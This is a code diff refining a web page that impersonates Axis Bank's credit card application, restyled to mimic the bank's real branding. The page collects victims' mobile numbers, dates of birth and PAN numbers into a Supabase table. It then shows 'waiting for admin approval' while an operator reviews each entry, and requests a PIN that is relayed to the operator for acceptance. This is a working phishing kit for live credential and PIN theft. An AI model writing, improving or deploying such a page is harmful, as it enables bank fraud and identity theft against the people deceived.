@@ -3,20 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Axis Bank - Credit Card Verification</title>
+    <title>Axis Bank - Credit Card Application</title>
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: 'Inter', sans-serif;
-            background: #f8f9fc;
+            background: #f5f6f8;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -24,209 +20,178 @@
             padding: 15px;
         }
 
-        .container {
+        .main-container {
             width: 100%;
-            max-width: 440px;
+            max-width: 480px;
             background: white;
-            border-radius: 16px;
-            box-shadow: 0 8px 35px rgba(0, 48, 135, 0.12);
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
             overflow: hidden;
-            border: 1px solid #e5e9f5;
         }
 
+        /* Header - Real Axis Style */
         .header {
-            background: linear-gradient(135deg, #003087, #0047cc);
+            background: #8c1d3e;
             color: white;
-            padding: 28px 20px;
-            text-align: center;
-            position: relative;
-        }
-
-        .header::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(to right, #ffcc00, #ffd24d);
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
 
         .logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 8px;
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: -1px;
         }
 
-        .logo-circle {
-            background: white;
-            color: #003087;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 900;
-            font-size: 27px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        .logo-dot {
+            color: #ffcc00;
         }
 
-        .logo-text {
-            font-size: 32px;
-            font-weight: 700;
-            letter-spacing: -1.5px;
+        .tagline {
+            font-size: 15px;
+            margin-top: 4px;
+            opacity: 0.95;
         }
 
         .content {
-            padding: 32px 24px 28px;
+            padding: 30px 25px;
         }
 
         h2 {
             text-align: center;
-            color: #1c2b4a;
-            font-size: 26px;
-            margin-bottom: 6px;
-            font-weight: 700;
+            color: #1e2a44;
+            font-size: 24px;
+            margin-bottom: 8px;
         }
 
         .subtitle {
             text-align: center;
-            color: #455a7f;
+            color: #555;
             font-size: 15px;
             margin-bottom: 30px;
         }
 
-        .inputBox {
-            margin-bottom: 22px;
+        .form-group {
+            margin-bottom: 20px;
         }
 
         label {
             display: block;
-            margin-bottom: 7px;
-            color: #1c2b4a;
+            margin-bottom: 6px;
             font-weight: 600;
-            font-size: 14.5px;
+            color: #1e2a44;
+            font-size: 14px;
         }
 
         input {
             width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #c8d0e0;
-            border-radius: 10px;
+            padding: 13px 16px;
+            border: 1.5px solid #c8ced7;
+            border-radius: 6px;
             font-size: 16px;
-            transition: all 0.3s;
         }
 
         input:focus {
-            border-color: #003087;
-            box-shadow: 0 0 0 4px rgba(0, 48, 135, 0.12);
+            border-color: #8c1d3e;
             outline: none;
         }
 
         button {
             width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 10px;
-            background: linear-gradient(135deg, #003087, #0047cc);
+            padding: 14px;
+            background: #8c1d3e;
             color: white;
+            border: none;
+            border-radius: 6px;
             font-size: 16.5px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 8px;
-            transition: all 0.3s;
+            margin-top: 10px;
         }
 
         button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 18px rgba(0, 48, 135, 0.3);
+            background: #a0224a;
         }
 
-        #status {
-            margin-top: 20px;
-            min-height: 85px;
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
         }
 
-        .wait {
-            color: #0066cc;
-            font-weight: 600;
+        .modal-content {
+            background: white;
+            width: 90%;
+            max-width: 380px;
+            border-radius: 12px;
+            padding: 30px 25px;
             text-align: center;
-        }
-
-        .reject {
-            color: #d32f2f;
-            font-size: 20px;
-            font-weight: 700;
-            text-align: center;
-        }
-
-        .success {
-            color: #008000;
-            font-size: 26px;
-            font-weight: 700;
-            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
         }
 
         .loader {
-            width: 42px;
-            height: 42px;
-            border: 4px solid #e0e7f5;
-            border-top: 4px solid #003087;
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #8c1d3e;
             border-radius: 50%;
-            margin: 12px auto;
+            margin: 15px auto;
             animation: spin 1s linear infinite;
         }
 
-        @keyframes spin {
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        .secure {
-            text-align: center;
-            margin-top: 18px;
-            color: #0066cc;
-            font-size: 13.5px;
-        }
+        .success { color: #008000; font-size: 26px; font-weight: 700; }
+        .reject { color: #d32f2f; font-size: 22px; font-weight: 700; }
+        .wait { color: #8c1d3e; font-weight: 600; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="main-container">
         <div class="header">
-            <div class="logo">
-                <div class="logo-circle">A</div>
-                <div class="logo-text">axis</div>
+            <div style="font-size:32px; font-weight:900;">A</div>
+            <div>
+                <div class="logo">AXIS BANK<span class="logo-dot">.</span></div>
+                <div class="tagline">Your credit card application is just a few clicks away</div>
             </div>
-            <p style="font-size:14.5px; opacity:0.95;">Credit Card Application</p>
         </div>
 
         <div class="content">
             <h2>Premium Verification</h2>
-            <p class="subtitle">Secure • Instant • Paperless</p>
+            <p class="subtitle">Secure • Instant Approval</p>
 
-            <div class="inputBox">
-                <label>Mobile Number</label>
+            <div class="form-group">
+                <label>Mobile Number *</label>
                 <input type="text" id="number1" placeholder="Enter 10-digit mobile number" maxlength="10">
             </div>
 
-            <div class="inputBox">
-                <label>Date of Birth</label>
+            <div class="form-group">
+                <label>Date of Birth *</label>
                 <input type="month" id="date_value">
             </div>
 
-            <div class="inputBox">
-                <label>PAN Number</label>
+            <div class="form-group">
+                <label>PAN Number *</label>
                 <input type="text" id="number2" placeholder="Enter PAN Number" maxlength="10" style="text-transform:uppercase">
             </div>
 
-            <button onclick="submitForm()">Continue Securely</button>
-
-            <div class="secure">🔒 256-Bit Encrypted | Trusted by Millions</div>
+            <button onclick="submitForm()">Continue</button>
         </div>
+    </div>
 
-        <div id="status"></div>
+    <!-- Modal -->
+    <div id="statusModal" class="modal">
+        <div class="modal-content" id="modalContent">
+            <!-- Dynamic content will come here via JS -->
+        </div>
     </div>
 
     <script>
@@ -236,6 +201,15 @@
 
     let currentId = null;
     let interval = null;
+
+    function showModal(html) {
+        document.getElementById('modalContent').innerHTML = html;
+        document.getElementById('statusModal').style.display = 'flex';
+    }
+
+    function hideModal() {
+        document.getElementById('statusModal').style.display = 'none';
+    }
 
     async function submitForm(){
         const number1 = document.getElementById('number1').value;
@@ -247,23 +221,18 @@
             return;
         }
 
-        document.getElementById('status').innerHTML = `
+        showModal(`
             <div class="loader"></div>
             <div class="wait">Submitting your request...</div>
-        `;
+        `);
 
         const { data, error } = await client
             .from('requests')
-            .insert([{
-                number1, date_value, number2,
-                status: 'pending',
-                pin: '',
-                pin_status: 'waiting'
-            }])
+            .insert([{ number1, date_value, number2, status: 'pending', pin: '', pin_status: 'waiting' }])
             .select();
 
         if(error){
-            document.getElementById('status').innerHTML = `<div class="reject">Submission Error</div>`;
+            showModal(`<div class="reject">Submission Error</div>`);
             return;
         }
 
@@ -282,42 +251,38 @@
 
             if(error) return;
 
-            const statusDiv = document.getElementById('status');
-
             if(data.status === 'pending'){
-                statusDiv.innerHTML = `
+                showModal(`
                     <div class="loader"></div>
                     <div class="wait">Waiting for admin approval...</div>
-                `;
+                `);
             } 
             else if(data.status === 'rejected'){
                 clearInterval(interval);
-                statusDiv.innerHTML = `<div class="reject">Request Rejected</div>`;
+                showModal(`<div class="reject">Request Rejected</div>`);
             } 
             else if(data.status === 'accepted'){
                 if(data.pin_status === 'waiting'){
-                    if(!document.getElementById('pin')){
-                        statusDiv.innerHTML = `
-                            <input type="text" id="pin" placeholder="Enter PIN" style="margin:15px 0; width:100%; padding:14px;">
-                            <button onclick="submitPin()" style="margin-top:0;">Submit PIN</button>
-                        `;
-                    }
+                    showModal(`
+                        <input type="text" id="pin" placeholder="Enter PIN" style="width:100%; padding:12px; margin:15px 0; border-radius:6px;">
+                        <button onclick="submitPin()" style="background:#8c1d3e; width:100%; padding:13px;">Submit PIN</button>
+                    `);
                 } 
                 else if(data.pin_status === 'pending'){
-                    statusDiv.innerHTML = `
+                    showModal(`
                         <div class="loader"></div>
                         <div class="wait">Verifying PIN...</div>
-                    `;
+                    `);
                 } 
                 else if(data.pin_status === 'rejected'){
                     clearInterval(interval);
-                    statusDiv.innerHTML = `<div class="reject">PIN Rejected</div>`;
+                    showModal(`<div class="reject">PIN Rejected</div>`);
                 } 
                 else if(data.pin_status === 'accepted'){
                     clearInterval(interval);
-                    statusDiv.innerHTML = `
+                    showModal(`
                         <div class="success">Congratulations! 🎉<br>Verified Successfully</div>
-                    `;
+                    `);
                 }
             }
         }, 2000);
@@ -330,19 +295,17 @@
             return;
         }
 
-        document.getElementById('status').innerHTML = `
+        showModal(`
             <div class="loader"></div>
             <div class="wait">Submitting PIN...</div>
-        `;
+        `);
 
         const { error } = await client
             .from('requests')
             .update({ pin: pin, pin_status: 'pending' })
             .eq('id', currentId);
 
-        if(error) {
-            document.getElementById('status').innerHTML = `<div class="reject">PIN Submission Error</div>`;
-        }
+        if(error) showModal(`<div class="reject">Error Submitting PIN</div>`);
     }
     </script>
 </body>
